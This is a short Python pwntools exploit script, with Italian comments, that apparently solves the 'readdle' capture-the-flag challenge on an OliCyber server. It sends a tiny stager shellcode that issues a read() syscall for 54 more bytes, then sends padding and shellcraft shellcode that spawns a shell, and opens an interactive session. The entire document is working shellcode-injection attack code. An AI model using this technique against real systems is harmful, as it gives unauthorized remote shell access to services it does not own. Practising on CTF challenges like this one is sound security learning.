#!/usr/bin/env python3

#guardo i registri e imposto i registri per fare una systemcall alla read() 
# e leggere altri 54 bytes dall'input 

from pwn import *

exe = ELF("./readdle_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("readdle.challs.olicyber.it", 10018)

    return r


def main():
    r = conn()

    pause()

    r.recvline()

    shellcode = b"\xB2\x36\x0F\x05"

    r.send(shellcode)

    r.send(b"\x00\x00\x00\x00" + asm(shellcraft.sh()))
    
    r.interactive()


if __name__ == "__main__":
    main()
